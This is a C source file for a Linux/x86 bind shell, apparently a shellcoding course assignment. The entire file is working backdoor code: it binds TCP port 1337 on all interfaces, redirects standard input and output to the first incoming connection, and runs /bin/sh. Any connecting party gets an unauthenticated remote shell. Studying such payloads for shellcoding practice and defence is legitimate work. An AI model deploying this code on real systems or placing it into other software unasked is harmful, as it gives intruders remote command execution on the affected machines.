// SLAE Assignment 1: Shell Bind TCP (Linux/x86)
// Author: 4p0cryph0n
// Website: https://4p0cryph0n.github.io

#include <stdio.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>

int main()
{
    //Defining Address Structure
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(1337); //Port no.
    addr.sin_addr.s_addr = htonl(INADDR_ANY); //Use any interface to listen

    //Create and Configure Socket
    int sockfd = socket(AF_INET, SOCK_STREAM, 0);

    //Bind Socket
    bind(sockfd, (struct sockaddr *)&addr, sizeof(addr));

    //Listen
    listen(sockfd, 0);

    //Accept
    int stdfd = accept(sockfd, NULL, NULL);

    //Duplicate Standard File Descriptors
    for (int i = 0; i <= 2; i++)
    {
        dup2(stdfd, i);
    }

    //Execute Shell
    execve("/bin/sh", NULL, NULL);
    return 0;
}
